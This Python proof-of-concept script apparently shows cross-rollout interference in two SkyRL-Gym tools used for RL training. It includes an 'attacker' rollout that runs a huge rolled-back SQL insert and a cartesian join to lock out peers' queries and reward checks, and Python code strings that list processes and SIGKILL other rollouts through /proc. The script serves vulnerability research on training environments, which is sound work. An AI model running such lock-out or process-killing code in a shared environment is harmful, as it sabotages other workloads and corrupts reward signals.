"""Cross-rollout interference in two SkyRL-Gym tools, copied unmodified from SkyRL 387bce8
(only the package import path changed).

1. SQL (SkyRL-SQL recipe): every rollout on the same db_id opens the same .sqlite file;
   each call runs BEGIN; <one statement>; ROLLBACK. Nothing persists, but a large write
   spills the page cache, takes the EXCLUSIVE lock, and holds it until the 5 s tool
   timeout; peers' reads wait for sqlite's 5 s busy timeout and then fail. The final
   reward (envs/sql/utils.py) runs the predicted and the gold query the same way.
2. Python (searchcode env): `python -c CODE`, same user and working directory as the
   trainer, no guard. Peers' code is visible in `ps` and their processes can be killed.
"""

import os
import sqlite3
import sys
import threading
import time

sys.path.insert(0, sys.argv[1])
from skyrl_tools.python import PythonCodeExecutorToolGroup  # noqa: E402
from skyrl_tools.sql import SQLCodeExecutorToolGroup  # noqa: E402
from skyrl_tools.sql_reward import calculate_reward_single  # noqa: E402

ROOT = sys.argv[2]
DB = "shop"


def make_db():
    os.makedirs(f"{ROOT}/{DB}", exist_ok=True)
    path = f"{ROOT}/{DB}/{DB}.sqlite"
    if os.path.exists(path):
        os.remove(path)
    c = sqlite3.connect(path)
    c.execute("CREATE TABLE orders (id INTEGER PRIMARY KEY, customer TEXT, amount REAL)")
    c.executemany("INSERT INTO orders VALUES (?, ?, ?)",
                  ((i, f"c{i % 500}", i % 97) for i in range(200_000)))
    c.commit()
    c.close()
    return path


GOLD = "SELECT customer, SUM(amount) FROM orders GROUP BY customer ORDER BY 2 DESC LIMIT 3"
COMPLETION = f"<think>sum per customer</think><solution>{GOLD}</solution>"
# one statement; rolled back at the end of the call, so nothing persists
HEAVY_WRITE = ("INSERT INTO orders (customer, amount) WITH RECURSIVE r(x) AS "
               "(SELECT 1 UNION ALL SELECT x + 1 FROM r) SELECT 'x', x FROM r LIMIT 50000000")
CARTESIAN = "SELECT COUNT(*) FROM orders a, orders b WHERE a.amount < b.amount"


def sql_trial(attacker_sql, label, repeats=1):
    tool = SQLCodeExecutorToolGroup(db_file_path=ROOT)
    out = {}

    def peer(i):
        time.sleep(0.5 + 0.3 * i)
        t = time.time()
        obs = tool.sql(DB, GOLD, turns_left=3)
        out[f"peer{i} tool"] = (round(time.time() - t, 1), "locked" if "locked" in obs
                                else "timeout" if "Timeout" in obs else "ok")
        t = time.time()
        r = calculate_reward_single(COMPLETION, GOLD, f"{ROOT}/{DB}/{DB}.sqlite")
        out[f"peer{i} reward"] = (round(time.time() - t, 1), r)

    def attacker():
        for k in range(repeats):
            t = time.time()
            obs = tool.sql(DB, attacker_sql, turns_left=3)
            out[f"attacker call {k}"] = (round(time.time() - t, 1), obs.strip()[:60].replace("\n", " "))

    ths = [threading.Thread(target=peer, args=(i,)) for i in range(3)]
    if attacker_sql:
        ths.append(threading.Thread(target=attacker))
    for th in ths:
        th.start()
    for th in ths:
        th.join()
    print(f"=== SQL: {label}", flush=True)
    for k in sorted(out):
        print(f"  {k}: {out[k]}", flush=True)


def python_trial():
    tool = PythonCodeExecutorToolGroup()
    honest = "import time; time.sleep(4); print('honest rollout finished')"
    probe = "import subprocess; print(subprocess.run(['ps','-o','pid,etime,args','-u',str(__import__('os').getuid())],capture_output=True,text=True).stdout)"
    kill = ("import os, signal\n"
            "for d in os.listdir('/proc'):\n"
            "    if d.isdigit() and int(d) != os.getpid():\n"
            "        try: c = open(f'/proc/{d}/cmdline','rb').read().split(b'\\0')\n"
            "        except Exception: continue\n"
            "        if c[:2] == [b'python', b'-c'] and b'honest' in c[2]:\n"
            "            os.kill(int(d), signal.SIGKILL); print('killed', d)\n")
    for label, other in [("probe", probe), ("kill", kill)]:
        out = {}

        def run(i, code, delay):
            time.sleep(delay)
            out[i] = tool.python(code)

        ths = [threading.Thread(target=run, args=(i, honest, 0)) for i in range(3)]
        ths.append(threading.Thread(target=run, args=(3, other, 1)))
        for th in ths:
            th.start()
        for th in ths:
            th.join()
        print(f"=== Python tool: 3 honest + 1 {label}", flush=True)
        for i in range(3):
            print(f"  honest {i} saw: {out[i]!r}")
        print(f"  {label} saw:\n" + "\n".join("    " + line for line in out[3].splitlines()[:12]), flush=True)


if __name__ == "__main__":
    if '--sql-only' not in sys.argv:
        python_trial()
    print("db:", make_db(), flush=True)
    sql_trial(None, "3 peers alone")
    sql_trial(CARTESIAN, "3 peers + attacker running a slow read (cartesian join)")
    for rep in range(2):
        sql_trial(HEAVY_WRITE, f"3 peers + attacker running a large rolled-back insert, repeat {rep}")
    for rep in range(2):
        sql_trial(HEAVY_WRITE, f"3 peers + attacker issuing the insert 3 times back to back, repeat {rep}", repeats=3)
